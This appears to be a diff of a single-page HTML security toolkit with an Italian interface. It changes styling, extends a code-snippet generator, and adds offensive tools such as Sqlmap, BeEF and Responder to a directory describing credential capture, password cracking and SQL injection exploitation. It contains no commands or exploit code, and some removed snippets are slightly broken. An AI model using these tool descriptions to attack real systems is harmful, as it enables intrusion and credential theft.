@@ -10,8 +10,8 @@
     
     <style>
         :root {
-            --bg-primary: #040811;
-            --bg-surface: #091122;
+            --bg-primary: #02050d;
+            --bg-surface: #060c1a;
             --accent-glow: #00f3ff;
             --accent-dim: #005f73;
             --text-main: #e0f7fa;
@@ -55,13 +55,13 @@
             height: 100vh;
             display: flex;
             flex-direction: column;
-            background: linear-gradient(180deg, rgba(4,8,17,0.5) 0%, rgba(9,17,34,0.7) 100%);
+            background: linear-gradient(180deg, rgba(4,8,17,0.3) 0%, rgba(9,17,34,0.5) 100%);
         }
 
         header {
             height: var(--header-h);
             border-bottom: 2px solid var(--accent-dim);
-            background: rgba(9, 17, 34, 0.95);
+            background: rgba(9, 17, 34, 0.85);
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -92,7 +92,7 @@
         }
 
         .sidebar {
-            background: rgba(4, 8, 17, 0.95);
+            background: rgba(4, 8, 17, 0.85);
             border-bottom: 1px solid var(--accent-dim);
             padding: 8px;
             display: flex;
@@ -108,7 +108,7 @@
         .sidebar::-webkit-scrollbar { display: none; }
 
         .nav-btn {
-            background: rgba(0, 95, 115, 0.15);
+            background: rgba(0, 95, 115, 0.2);
             border: 1px solid var(--accent-dim);
             color: var(--text-main);
             padding: 10px 14px;
@@ -122,24 +122,24 @@
         }
 
         .nav-btn:hover, .nav-btn.active {
-            background: rgba(0, 243, 255, 0.2);
+            background: rgba(0, 243, 255, 0.25);
             border-color: var(--accent-glow);
             color: var(--accent-glow);
-            box-shadow: 0 0 8px rgba(0, 243, 255, 0.25);
+            box-shadow: 0 0 8px rgba(0, 243, 255, 0.3);
         }
 
         .workspace {
             flex-grow: 1;
             padding: 15px;
             overflow-y: auto;
-            background: rgba(9, 17, 34, 0.4);
+            background: rgba(9, 17, 34, 0.2);
             -webkit-overflow-scrolling: touch;
         }
 
         .module-panel {
             display: none;
             animation: fadeIn 0.25s ease forwards;
-            background: rgba(9, 17, 34, 0.92);
+            background: rgba(9, 17, 34, 0.88);
             border: 1px solid var(--accent-dim);
             padding: 15px;
             border-radius: 6px;
@@ -151,18 +151,18 @@
         .module-panel.active { display: block; }
 
         h2.title-crypto {
-            color: var(--security-pass);
-            text-shadow: 0 0 8px rgba(0, 255, 102, 0.4);
+            color: #33ff88;
+            text-shadow: 0 0 12px #00ff66, 0 0 25px rgba(0, 255, 102, 0.6);
             margin-bottom: 15px;
             font-size: 1.2rem;
-            border-bottom: 2px solid var(--security-pass);
+            border-bottom: 2px solid #00ff66;
             padding-bottom: 6px;
             text-transform: uppercase;
         }
 
         h2.title-factory {
-            color: #4582ec;
-            text-shadow: 0 0 8px rgba(69, 130, 236, 0.4);
+            color: #6699ff;
+            text-shadow: 0 0 12px #4582ec, 0 0 25px rgba(69, 130, 236, 0.6);
             margin-bottom: 15px;
             font-size: 1.2rem;
             border-bottom: 2px solid #4582ec;
@@ -171,8 +171,8 @@
         }
 
         h2.title-tools {
-            color: var(--accent-glow);
-            text-shadow: 0 0 8px rgba(0, 243, 255, 0.4);
+            color: #33f7ff;
+            text-shadow: 0 0 12px #00f3ff, 0 0 25px rgba(0, 243, 255, 0.6);
             margin-bottom: 15px;
             font-size: 1.2rem;
             border-bottom: 2px solid var(--accent-glow);
@@ -284,8 +284,13 @@
             border-radius: 4px;
         }
 
+        .console-output.error {
+            color: var(--security-fail);
+            border-color: var(--security-fail);
+        }
+
         .tool-card {
-            background: rgba(4, 8, 17, 0.7);
+            background: rgba(4, 8, 17, 0.85);
             border: 1px solid #142844;
             padding: 15px;
             margin-bottom: 15px;
@@ -387,6 +392,8 @@
                             <option value="base64">Base64 Encoding Standard</option>
                             <option value="hex">Hexadecimal (Esadecimale Base16)</option>
                             <option value="url">URL Encoding / Percent Encoding</option>
+                            <option value="base64url">Base64URL Safe-Schema (JWT Variant)</option>
+                            <option value="binary">Binary Stream Representation (Base2)</option>
                         </select>
                     </div>
                     <div class="input-group">
@@ -402,7 +409,7 @@
                 </div>
 
                 <div id="mod-factory" class="module-panel">
-                    <h2 class="title-factory">⚡ 2. Generatore Industriale di Codice Avanzato (17 Linguaggi x 20 Script)</h2>
+                    <h2 class="title-factory">⚡ 2. Generatore Industriale di Codice Avanzato (19 Linguaggi x 20 Script)</h2>
                     <p style="font-size:0.8rem; color:var(--text-muted); margin-bottom:12px;">Seleziona un linguaggio strutturato dall'elenco esteso. Ciascuno contiene 20 algoritmi reali ottimizzati ad alte prestazioni.</p>
                     <div class="grid-split" style="margin-bottom: 12px;">
                         <div style="flex: 1;">
@@ -410,6 +417,8 @@
                             <select id="factory-lang" onchange="Modules.updateScriptSelect()">
                                 <option value="python">Python</option>
                                 <option value="javascript">JavaScript (Node.js)</option>
+                                <option value="c">C (ANSI/ISO)</option>
+                                <option value="sql">SQL (Structured Query)</option>
                                 <option value="go">Go (Golang)</option>
                                 <option value="rust">Rust</option>
                                 <option value="cpp">C++ (Modern)</option>
@@ -438,8 +447,8 @@
                 </div>
 
                 <div id="mod-tools" class="module-panel">
-                    <h2 class="title-tools">🛠️ 3. Cybersecurity Tool Directory (15 Strumenti Professionali)</h2>
-                    <input type="text" id="tool-search" class="search-bar" placeholder="🔍 Cerca tool per nome, funzioni o risorse (es. nmap, wireshark, ram...)" onkeyup="Modules.filterTools()">
+                    <h2 class="title-tools">🛠️ 3. Cybersecurity Tool Directory (20 Strumenti Professionali)</h2>
+                    <input type="text" id="tool-search" class="search-bar" placeholder="🔍 Cerca tool per nome, funzioni o risorse (es. nmap, wireshark, hydra...)" onkeyup="Modules.filterTools()">
                     <div id="tools-container"></div>
                 </div>
             </div>
@@ -461,400 +470,324 @@
             { name: "Hydra", link: "https://github.com/vanhauser-thc/thc-hydra", desc: "Parallelized login cracker per l'auditing di rete offline/online.", detailed: "Esegue attacchi a dizionario paralleli e rapidissimi contro protocolli di autenticazione remoti come SSH, FTP, HTTP Auth, Telnet, RDP, SMB.", diag: "[Target Network Daemon] <=== (Multiple Concurrent Worker Threads) === [Hydra Password Guessing Array]" },
             { name: "Hashcat", link: "https://hashcat.net/hashcat/", desc: "Il cracking tool basato su GPU più veloce al mondo.", detailed: "Sfrutta la potenza di calcolo parallelo delle schede video (tramite OpenCL/CUDA) per rompere hash crittografici a velocità elevatissime.", diag: "[Target Hashes File] ---> [GPU Core Multi-Threading Matrix] ---> [Kernel Attack Generator Loop]" },
             { name: "Aircrack-ng", link: "https://www.aircrack-ng.org", desc: "Suite completa per l'auditing e la valutazione della sicurezza di reti wireless 802.11.", detailed: "Include moduli per il monitoraggio dei pacchetti wireless, attacchi di iniezione e cracking di chiavi WEP e WPA/WPA2-PSK tramite cattura dell'handshake.", diag: "[Wireless Environment] ---> [Airodump-ng Capture Buffer] ---> [4-Way Handshake File] ---> [Aircrack Engine]" },
-            { name: "OWASP ZAP", link: "https://www.zaproxy.org", desc: "Scanner di vulnerabilità web automatizzato e manuale.", detailed: "Agisce como proxy trasparente e include funzioni di spidering, active scanning, passive scanning e fuzzer di parametri per identificare falle logiche web.", diag: "[ZAP Crawler Engine] ---> [Automated Active Scanner Modules] ---> [Target Web App Nodes Tree]" },
-            { name: "Nikto", link: "https://cirt.net/Nikto2", desc: "Scanner di server web open-source per elementi pericolosi.", detailed: "Esamina i server web per identificare file/programmi potenzialmente pericolosi, versioni obsolete di software server e directory listing attivo.", diag: "[Nikto Script Core] ---> [HTTP/S Target Request Pool] ---> [Server Header Evaluation & Resource Checking]" },
+            { name: "OWASP ZAP", link: "https://www.zaproxy.org", desc: "Scanner di vulnerabilità web automatizzato e manuale.", detailed: "Agisce como proxy trasparente e include funzioni di spidering, active scanning, passive scanning e fuzzer di parametri per identificar falle logiche web.", diag: "[ZAP Crawler Engine] ---> [Automated Active Scanner Modules] ---> [Target Web App Nodes Tree]" },
+            { name: "Nikto", link: "https://cirt.net/Nikto2", desc: "Scanner di server web open-source per elementi pericolosi.", detailed: "Esamina i server web per identificar file/programmi potenzialmente pericolosi, versioni obsolete di software server e directory listing attivo.", diag: "[Nikto Script Core] ---> [HTTP/S Target Request Pool] ---> [Server Header Evaluation & Resource Checking]" },
             { name: "Gobuster", link: "https://github.com/OJ/gobuster", desc: "Strumento di brute-forcing di directory, file e record DNS in Go.", detailed: "Sfrutta la concorrenza nativa di Go per scansionare ad alta velocità percorsi HTTP nascosti, sottodomini DNS o Virtual Host.", diag: "[Wordlist File Buffer] ---> [Go Routine Multi-Threaded HTTP Requester] ---> [Target Endpoint]" },
             { name: "Volatility Framework", link: "https://www.volatilityfoundation.org", desc: "Suite per l'analisi forense avanzata della memoria volatile (RAM).", detailed: "Permette l'estrazione dello stato digitale da dump di memoria RAM, analizzando processi attivi, connessioni aperte e codice iniettato.", diag: "[Raw RAM Dump File] ---> [Volatility Profile Alignment Module] ---> [Kernel Structure Dissector Engine]" },
             { name: "Ghidra", link: "https://ghidra-sre.org", desc: "Software Reverse Engineering (SRE) framework sviluppato dalla NSA.", detailed: "Include strumenti complessi per l'analisi di codice compilato. Offre funzionalità di disassemblaggio, decompilazione in pseudo-codice C e grafi di flusso.", diag: "[Compiled Binary Artifact] ---> [Sleigh Architecture Parser] ---> [Decompiler Control Flow Graph]" },
             { name: "Tshark", link: "https://www.wireshark.org/docs/man-pages/tshark.html", desc: "La controparte a riga di comando (CLI) di Wireshark.", detailed: "Consente la cattura del traffico di rete o la decodifica di file di cattura preesistenti (pcap) direttamente dal terminale per automazione e scripting.", diag: "[Network Traffic Input Stream] ---> [Tshark Core CLI Capture Engine] ---> [Packet Field Extractor]" },
-            { name: "BloodHound", link: "https://github.com/BloodHoundAD/BloodHound", desc: "Applicazione per mappare graficamente le relazioni in Active Directory.", detailed: "Utilizza la teoria dei grafi per mappare in modo visivo le relazioni complesse all'interno di Active Directory, trovando catene di escalation dei privilegi.", diag: "[Active Directory Domain Controller] ---> [SharpHound Data Ingestor] ---> [Neo4j Graph Database Storage]" }
+            { name: "BloodHound", link: "https://github.com/BloodHoundAD/BloodHound", desc: "Applicazione per mappare graficamente le relazioni in Active Directory.", detailed: "Utilizza la teoria dei grafi per mappare in modo visivo le relazioni complesse all'interno di Active Directory, trovando catene di escalation dei privileges.", diag: "[Active Directory Domain Controller] ---> [SharpHound Data Ingestor] ---> [Neo4j Graph Database Storage]" },
+            { name: "Sqlmap", link: "https://sqlmap.org", desc: "Strumento di penetration testing automatizzato per rilevare e sfruttare falle di SQL Injection.", detailed: "Automatizza il processo di identificazione e sfruttamento di vulnerabilità SQL injection per prendere il controllo di database server remoti.", diag: "[User Input Field] ---> [Sqlmap Payload Injector] ---> [Database Error Response Analyzer]" },
+            { name: "Radare2", link: "https://www.radare.org", desc: "Framework portabile per il reverse-engineering e l'analisi binaria a riga di comando.", detailed: "Fornisce un set completo di utility CLI per disassemblare, fare debugging ed esaminare file eseguibili raw, malware e firmware.", diag: "[Target Binary Hex] ---> [R2 Core Engine Analizer] ---> [Disassembled Assembly Workspace]" },
+            { name: "Impacket", link: "https://github.com/fortra/impacket", desc: "Raccolta di classi Python per lavorare con i protocolli di rete di basso livello.", detailed: "Fornisce accesso programmatico di basso livello per pacchetti di rete e protocolli Windows complessi come SMB, MSRPC, NTLM e Kerberos.", diag: "[Python Attack Script] ---> [Impacket Protocol Stack Importer] ---> [Active Directory RPC Request]" },
+            { name: "Beef (Browser Exploitation Framework)", link: "https://beefproject.com", desc: "Strumento di penetration testing focalizzato sui vettori di attacco lato client/browser.", detailed: "Esamina la sicurezza complessiva di un target utilizzando vettori di attacco diretti all'applicazione browser, controllando i nodi tramite hook JavaScript.", diag: "[Target Browser (Hooked)] <---> [BeEF Command Control Dashboard] <---> [XSS Injection Node]" },
+            { name: "Responder", link: "https://github.com/lgandx/Responder", desc: "Infiltratore e avvelenatore di protocolli di rete locali LLMNR, NBT-NS e MDNS.", detailed: "Risponde selettivamente alle query di risoluzione dei nomi locali Windows, intercettando e catturando hash di autenticazione NTLMv1/v2 sulla rete.", diag: "[Victim Net Query] ---> [Responder Poisoner Listening Core] ---> [Captured NetNTLM Hash Storage]" }
         ];
 
-        // CONFIGURAZIONE COMPLETA COMPRENDENTE 17 LINGUAGGI CON 20 CODE-BLOCKS COMPLETI E REALI PER LINGUAGGIO
-        const DB_CODE = {
-            python: [
-                { name: "1. Asynchronous HTTP Client (aiohttp)", code: "import asyncio\nimport aiohttp\n\nasync def fetch(session, url):\n    async with session.get(url) as response:\n        return await response.text()\n\nasync def main():\n    async with aiohttp.ClientSession() as session:\n        html = await fetch(session, 'https://example.com')\n        print(html)\n\nasyncio.run(main())" },
-                { name: "2. Concurrent Thread Pool Worker", code: "from concurrent.futures import ThreadPoolExecutor\nimport time\n\ndef task(n):\n    time.sleep(0.1)\n    return f'Task {n} completato'\n\nwith ThreadPoolExecutor(max_workers=5) as executor:\n    results = executor.map(task, range(15))\n    for r in results: print(r)" },
-                { name: "3. Custom Secure TCP Client", code: "import socket\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.connect(('127.0.0.1', 8080))\n    s.sendall(b'Hello, Server')\n    data = s.recv(1024)\nprint('Ricevuto:', data.decode())" },
-                { name: "4. Robust JSON Parser Guard", code: "import json\n\ndef parse_safely(data_str):\n    try:\n        return json.loads(data_str)\n    except json.JSONDecodeError as e:\n        return {'error': str(e)}\n\nprint(parse_safely('{\"status\": \"active\"}'))" },
-                { name: "5. Memory Leak Monitor System", code: "import gc\n\ndef check_memory_leaks():\n    gc.collect()\n    leaks = gc.garbage\n    print(f'Oggetti non recuperabili rilevati: {len(leaks)}')\n\ncheck_memory_leaks()" },
-                { name: "6. Advanced Regular Expression Filter", code: "import re\n\ndef clean_text(text):\n    pattern = re.compile(r'[^a-zA-Z0-9\\s]')\n    return pattern.sub('', text)\n\nprint(clean_text('Test! @String #Cleaned.'))" },
-                { name: "7. Generator Pipeline Stream Reader", code: "def read_large_file(file_path):\n    with open(file_path, 'r') as f:\n        for line in f:\n            yield line.strip()" },
-                { name: "8. Decorator-based Execution Timer", code: "import time\n\ndef timer(func):\n    def wrapper(*args, **kwargs):\n        start = time.time()\n        res = func(*args, **kwargs)\n        print(f'Tempo d execution: {time.time()-start:.4f}s')\n        return res\n    return wrapper" },
-                { name: "9. Base64 Binary File Processor", code: "import base64\n\ndef encode_file_data(data_bytes):\n    return base64.b64encode(data_bytes).decode('utf-8')" },
-                { name: "10. Structural Pattern Matching Router", code: "def process_command(cmd):\n    match cmd.split():\n        case ['quit']: return 'Arresto'\n        case ['run', target]: return f'Esecuzione su {target}'\n        case _: return 'Comando Sconosciuto'" },
-                { name: "11. AES Context Manager State Simulation", code: "class EncryptedSession:\n    def __enter__(self):\n        print('Canale cifrato allocato')\n        return self\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        print('Canale rilasciato ed azzerato')" },
-                { name: "12. Argument Parser CLI Architecture", code: "import argparse\nparser = argparse.ArgumentParser()\nparser.add_argument('--target', required=True)\nprint(parser.parse_args())" },
-                { name: "13. Subprocess Execution Sandbox", code: "import subprocess\nres = subprocess.run(['echo', 'GPU-X'], capture_output=True, text=True)\nprint(res.stdout)" },
-                { name: "14. Lambda Map-Filter Pipeline Matrix", code: "items = range(100)\nprocessed = list(map(lambda x: x * 2, filter(lambda x: x % 5 == 0, items)))" },
-                { name: "15. Thread-Safe Singleton Engine", code: "class SystemKernel:\n    _instance = None\n    def __new__(cls):\n        if not cls._instance:\n            cls._instance = super().__new__(cls)\n        return cls._instance" },
-                { name: "16. Async IO Signal Handler", code: "import asyncio\nimport signal\ndef handler():\n    print('Segnale ricevuto')\nloop = asyncio.get_event_loop()\nloop.add_signal_handler(signal.SIGINT, handler)" },
-                { name: "17. Custom Path Traversal Guard", code: "import os\ndef safe_join(base, user_path):\n    resolved = os.path.abspath(os.path.join(base, user_path))\n    return resolved if resolved.startswith(base) else None" },
-                { name: "18. Cryptographically Secure Token Generator", code: "import secrets\ndef gen_token():\n    return secrets.token_hex(32)" },
-                { name: "19. Abstract Base Class Enforcement", code: "from abc import ABC, abstractmethod\nclass Plugin(ABC):\n    @abstractmethod\n    def execute(self): pass" },
-                { name: "20. Threaded Shared Memory Buffer", code: "from threading import Lock\nclass SafeBuffer:\n    def __init__(self): self.lock, self.data = Lock(), []\n    def add(self, item):\n        with self.lock: self.data.append(item)" }
-            ],
-            javascript: [
-                { name: "1. Cluster Module Worker Spawner", code: "const cluster = require('cluster');\nconst http = require('http');\nif (cluster.isMaster) {\n  for (let i = 0; i < 4; i++) cluster.fork();\n} else {\n  http.createServer((req, res) => { res.end('OK'); }).listen(8000);\n}" },
-                { name: "2. Modern Promise Event Loop Pipeline", code: "const delay = ms => new Promise(res => setTimeout(res, ms));\nasync function workflow() {\n  await delay(100); console.log('Step 1 complete');\n}\nworkflow();" },
-                { name: "3. Memory Efficient Streams File Copy", code: "const fs = require('fs');\nconst readStream = fs.createReadStream('source.dat');\nconst writeStream = fs.createWriteStream('dest.dat');\nreadStream.pipe(writeStream);" },
-                { name: "4. Custom Event Emitter Monitor", code: "const EventEmitter = require('events');\nclass AuditEmitter extends EventEmitter {}\nconst monitor = new AuditEmitter();\nmonitor.on('alert', (msg) => console.warn(msg));" },
-                { name: "5. Performance Hooks API Probe", code: "const { performance } = require('perf_hooks');\nconst start = performance.now();\nconsole.log(performance.now() - start);" },
-                { name: "6. WebCrypto Subkey Buffer Import", code: "async function importKey(raw) {\n  return await crypto.subtle.importKey('raw', raw, 'AES-GCM', true, ['encrypt']);\n}" },
-                { name: "7. Advanced Proxy Object Interceptor", code: "const target = { secret: 'GPU-X-Key' };\nconst proxy = new Proxy(target, {\n  get: (obj, prop) => { return prop in obj ? obj[prop] : 'Denied'; }\n});" },
-                { name: "8. Cryptographic Array Buffer Scrambler", code: "const buf = new Uint8Array(16); crypto.getRandomValues(buf);" },
-                { name: "9. Deep Object Freeze Recursion", code: "function deepFreeze(obj) {\n  Object.keys(obj).forEach(name => {\n    if(typeof obj[name] === 'object') deepFreeze(obj[name]);\n  });\n  return Object.freeze(obj);\n}" },
-                { name: "10. Custom Middleware Array Pipeline", code: "const pipeline = [ (ctx) => { ctx.val += 1; }, (ctx) => { ctx.val *= 2; } ];" },
-                { name: "11. Worker Threads Matrix Multiplying", code: "const { Worker } = require('worker_threads');\nconst worker = new Worker('setTimeout(() => {}, 1000);');" },
-                { name: "12. High-Performance Object Pool Engine", code: "class Pool { constructor() { this.items = []; } acquire() { return this.items.pop() || {}; } }" },
-                { name: "13. JWT Sign Simulation Algorithm", code: "const crypto = require('crypto');\nfunction sign(p, s) { return crypto.createHmac('sha256', s).update(p).digest('base64'); }" },
-                { name: "14. Functional Currying Composition Matrix", code: "const compose = (f, g) => (x) => f(g(x));" },
-                { name: "15. Error Boundary Fallback Wrapper", code: "try { JSON.parse('{invalid}'); } catch(e) { console.error('Safe recovery active'); }" },
-                { name: "16. High-Precision Nano-Timer Block", code: "const start = process.hrtime.bigint();\nconst end = process.hrtime.bigint();" },
-                { name: "17. Dynamic Object Destructuring Defaulting", code: "const extract = ({ target = 'default', ports = [] }) => ({ target, ports });" },
-                { name: "18. Secure HTTP Headers Set Injection", code: "const headers = { 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY' };" },
-                { name: "19. Non-blocking Microtask Execution", code: "queueMicrotask(() => console.log('Esecuzione prioritaria automatica'));" },
-                { name: "20. Custom File Path Sanitizer Core", code: "const path = require('path');\nconst safe = p => path.normalize(p).replace(/^(\\.\\.(\\/|\\\\|$))+/, '');" }
-            ],
-            go: [
-                { name: "1. Goroutine Concurrency Channel Pool", code: "package main\nimport \"fmt\"\nfunc worker(id int, jobs <-chan int, results chan<- int) {\n    for j := range jobs { results <- j * 2 }\n}" },
-                { name: "2. Select Statement Timeout Multi-channel", code: "package main\nimport (\"time\"; \"fmt\")\nfunc main() {\n  c1 := make(chan string)\n  select {\n    case res := <-c1: fmt.Println(res)\n    case <-time.After(1 * time.Second): fmt.Println(\"timeout\")\n  }\n}" },
-                { name: "3. Mutex Resource Synchronization Lock", code: "package main\nimport \"sync\"\ntype SafeCounter struct { mu sync.Mutex; v int }\nfunc (c *SafeCounter) Inc() { c.mu.Lock(); c.v++; c.mu.Unlock(); }" },
-                { name: "4. Context Tree Cancellation Signal", code: "package main\nimport (\"context\"; \"time\")\nfunc main() {\n  ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)\n  defer cancel()\n  <-ctx.Done()\n}" },
-                { name: "5. Custom HTTP Router Multiplexer Core", code: "package main\nimport \"net/http\"\nfunc main() {\n  mux := http.NewServeMux()\n  mux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\"GPU-X\")) })\n}" },
-                { name: "6. JSON Stream Encoder/Decoder Implementation", code: "package main\nimport (\"encoding/json\"; \"os\")\nfunc main() {\n  json.NewEncoder(os.Stdout).Encode(map[string]string{\"status\": \"active\"})\n}" },
-                { name: "7. WaitGroup Concurrency Synchronizer", code: "package main\nimport \"sync\"\nfunc main() { var wg sync.WaitGroup; wg.Add(1); go func() { defer wg.Done() }(); wg.Wait() }" },
-                { name: "8. Atomic Counters Memory Management", code: "package main\nimport \"sync/atomic\"\nfunc main() { var ops uint64; atomic.AddUint64(&ops, 1) }" },
-                { name: "9. TCP Connection KeepAlive Monitor", code: "package main\nimport (\"net\"; \"time\")\nfunc main() {\n  l, _ := net.ListenTCP(\"tcp\", nil)\n  l.SetDeadline(time.Now().Add(time.Hour))\n}" },
-                { name: "10. Custom Interface Polymorphism Array", code: "package main\ntype Runner interface { Run() }\ntype Task struct{}\nfunc (t Task) Run() {}" },
-                { name: "11. System Signal Interceptor Hook", code: "package main\nimport (\"os\"; \"os/signal\"; \"syscall\")\nfunc main() { c := make(chan os.Signal, 1); signal.Notify(c, syscall.SIGINT); <-c }" },
-                { name: "12. Reflection Structure Inspections Engine", code: "package main\nimport (\"reflect\"; \"fmt\")\nfunc check(i interface{}) { t := reflect.TypeOf(i); fmt.Println(t.Name()) }" },
-                { name: "13. Memory Allocation Benchmark Structure", code: "package main\nimport \"testing\"\nfunc BenchmarkAlloc(b *testing.B) { for i := 0; i < b.N; i++ { _ = make([]byte, 1024) } }" },
-                { name: "14. Encrypted Stream Reader Adapter", code: "package main\nimport (\"crypto/aes\"; \"crypto/cipher\"; \"io\")\nfunc getStream(block cipher.Block, iv []byte, r io.Reader) io.Reader {\n  return &cipher.StreamReader{S: cipher.NewOFB(block, iv), R: r}\n}" },
-                { name: "15. Panic and Recovery Error Boundary", code: "package main\nimport \"fmt\"\nfunc protect() { defer func() { if r := recover(); r != nil { fmt.Println(\"Recovered\") } }() ; panic(\"crash\") }" },
-                { name: "16. Custom Error Wrapping Implementation", code: "package main\nimport (\"errors\"; \"fmt\")\nfunc err() error { return fmt.Errorf(\"fallimento: %w\", errors.New(\"root cause\")) }" },
-                { name: "17. Optimized Byte Slice Allocation Pool", code: "package main\nimport \"sync\"\nvar pool = sync.Pool{New: func() interface{} { return make([]byte, 4096) }}" },
-                { name: "18. Secure Password Hashing Simulation", code: "package main\nimport \"crypto/sha256\"\nfunc hash(p []byte) [32]byte { return sha256.Sum256(p) }" },
-                { name: "19. Worker Task Queue Dispatcher", code: "package main\nfunc dispatch(ch chan int) { ch <- 1; close(ch) }" },
-                { name: "20. I/O Buffer Scanner Stream Process", code: "package main\nimport (\"bufio\"; \"strings\")\nfunc scan(s string) { sc := bufio.NewScanner(strings.NewReader(s)); for sc.Scan() { _ = sc.Text() } }" }
-            ],
-            rust: [
-                { name: "1. Thread Spawn Move Closures", code: "use std::thread;\nfn main() {\n    let handle = thread::spawn(|| { println!(\"Thread GPU-X\"); });\n    handle.join().unwrap();\n}" },
-                { name: "2. Arc Mutex Concurrency Pointer", code: "use std::sync::{Arc, Mutex};\nuse std::thread;\nfn main() {\n  let counter = Arc::new(Mutex::new(0));\n  let c = Arc::clone(&counter);\n  thread::spawn(move || { *c.lock().unwrap() += 1; });\n}" },
-                { name: "3. Lifetime Static Reference Allocator", code: "fn get_str() -> &'static str { \"GPU-X\" }" },
-                { name: "4. Custom Error Enum Result Pattern", code: "std::fmt::Debug;\nenum MyError { Io, Format }\ntype Result<T> = std::result::Result<T, MyError>;" },
-                { name: "5. Asynchronous Async/Await Tokio Runtime", code: "#[tokio::main]\nasync fn main() { println!(\"Async rust run\"); }" },
-                { name: "6. Macro Rules Compiler Template", code: "macro_rules! say_hello { () => { println!(\"Hello\"); }; }\nfn main() { say_hello!(); }" },
-                { name: "7. Zero-Copy String Reference Slices", code: "fn process(s: &str) { println!(\"{}\", s); }" },
-                { name: "8. Vector Capacity Pre-allocation Arena", code: "fn main() { let mut v = Vec::with_capacity(100); v.push(1); }" },
-                { name: "9. Trait Polymorphism Dynamic Dispatch", code: "trait Run { fn run(&self); }\nfn execute(r: &dyn Run) { r.run(); }" },
-                { name: "10. File I/O Buffer Reader Pipeline", code: "use std::fs::File;\nuse std::io::{BufReader, BufRead};\nfn read() { let f = File::open(\"a.txt\").unwrap(); let r = BufReader::new(f); }" },
-                { name: "11. Unsafe Raw Pointers Operations", code: "fn main() { let x = 5; let raw = &x as *const i32; unsafe { println!(\"{}\", *raw); } }" },
-                { name: "12. Pattern Matching Structural Guards", code: "fn test(x: Option<i32>) { match x { Some(i) if i > 5 => println!(\"OK\"), _ => {} } }" },
-                { name: "13. Channels Crossbeam Message Passing", code: "use std::sync::mpsc::channel;\nfn main() { let (tx, rx) = channel(); tx.send(10).unwrap(); }" },
-                { name: "14. Smart Pointers Rc/RefCell Management", code: "use std::rc::Rc; use std::cell::RefCell;\nfn main() { let x = Rc::new(RefCell::new(5)); *x.borrow_mut() = 6; }" },
-                { name: "15. Drop Trait Destructor Deallocator", code: "struct Item;\nimpl Drop for Item { fn drop(&mut self) { println!(\"Rilasciato\"); } }" },
-                { name: "16. Atomic Flags Synchronizer", code: "use std::sync::atomic::{AtomicBool, Ordering};\nstatic FLAG: AtomicBool = AtomicBool::new(false);" },
-                { name: "17. Non-Zero Optimization Layout", code: "use std::num::NonZeroU32;\nfn check(x: NonZeroU32) -> u32 { x.get() }" },
-                { name: "18. Custom Struct Implementation Matrix", code: "struct Core { val: u32 }\nimpl Core { fn new(v: u32) -> Self { Core { val: v } } }" },
-                { name: "19. Binary Heap Priority Queue Array", code: "use std::collections::BinaryHeap;\nfn queue() { let mut h = BinaryHeap::new(); h.push(1); }" },
-                { name: "20. Advanced FFI Binding Simulators", code: "extern \"C\" { fn abs(input: i32) -> i32; }\nfn main() { unsafe { abs(-5); } }" }
-            ],
-            cpp: [
-                { name: "1. Smart Pointers std::unique_ptr Arena", code: "#include <memory>\nstruct Node { int val; };\nvoid run() { auto node = std::make_unique<Node>(); }" },
-                { name: "2. Modern Multi-threading std::thread & Lambda", code: "#include <thread>\nvoid launch() { std::thread t([]() { }); t.join(); }" },
-                { name: "3. RAII Resource Lock Guard System", code: "#include <mutex>\nstd::mutex m; void safe() { std::lock_guard<std::mutex> lock(m); }" },
-                { name: "4. Templates Metaprogramming Compile-time Calc", code: "template<int N> struct Fact { static const int val = N * Fact<N-1>::val; };\ntemplate<> struct Fact<0> { static const int val = 1; };" },
-                { name: "5. Move Semantics std::move Optimizations", code: "#include <utility>\n#include <vector>\nvoid moveData() { std::vector<int> v1 = {1,2}; std::vector<int> v2 = std::move(v1); }" },
-                { name: "6. Virtual Tables Dynamic Polymorphism Engine", code: "class Base { virtual void run() = 0; };\nclass Der : public Base { void run() override {} };" },
-                { name: "7. Custom Memory Allocator Memory Pools", code: "#include <cstddef>\nclass Pool { char buf[1024]; public: void* alloc(size_t s) { return buf; } };" },
-                { name: "8. Standard Template Library Vector Pre-allocation", code: "#include <vector>\nvoid setup() { std::vector<int> v; v.reserve(1000); }" },
-                { name: "9. Exception Safety Strong Guarantee Framework", code: "struct State { int x; };\nvoid update(State& s) { State tmp = s; tmp.x = 10; s = tmp; }" },
-                { name: "10. Chrono High-Resolution Clock Profiler", code: "#include <chrono>\nauto runTime() { return std::chrono::high_resolution_clock::now(); }" },
-                { name: "11. Atomic Operations Flag State Machine", code: "#include <atomic>\nstd::atomic<bool> ready(false);" },
-                { name: "12. File Stream Binary Serializer Engine", code: "#include <fstream>\nvoid save(int x) { std::ofstream f(\"b.bin\", std::ios::binary); f.write((char*)&x, sizeof(x)); }" },
-                { name: "13. Bitwise Manipulation Registry Controllers", code: "void setBit(unsigned int& reg, int pos) { reg |= (1 << pos); }" },
-                { name: "14. Condition Variables Inter-Thread Signaling", code: "#include <condition_variable>\nstd::condition_variable cv; std::mutex m; void notify() { cv.notify_one(); }" },
-                { name: "15. Modern Concepts Type Constraints (C++20)", code: "template<typename T> concept Numeric = std::is_integral_v<T>;\ntemplate<Numeric T> T add(T a, T b) { return a + b; }" },
-                { name: "16. Custom Constexpr Runtime Matrix", code: "constexpr int square(int x) { return x * x; }" },
-                { name: "17. Structured Bindings Evaluator", code: "#include <tuple>\nauto get_data() { return std::make_tuple(1, 2.5); }\nvoid use() { auto [a, b] = get_data(); }" },
-                { name: "18. Explicit Operator Overloading Framework", code: "struct Box { explicit operator bool() const { return true; } };" },
-                { name: "19. Fast I/O Optimization Stream", code: "#include <iostream>\nvoid fast() { std::ios_base::sync_with_stdio(false); std::cin.tie(NULL); }" },
-                { name: "20. Lambda Auto Return Expressions", code: "auto comp = [](auto a, auto b) { return a < b; };" }
-            ],
-            powershell: [
-                { name: "1. Runspace Concurrent Multithreading", code: "[runspacepool]$pool = [runspacefactory]::CreateRunspacePool(1, 5)\n$pool.Open()" },
-                { name: "2. Advanced .NET Object Invocation Engine", code: "$client = New-Object System.Net.WebClient" },
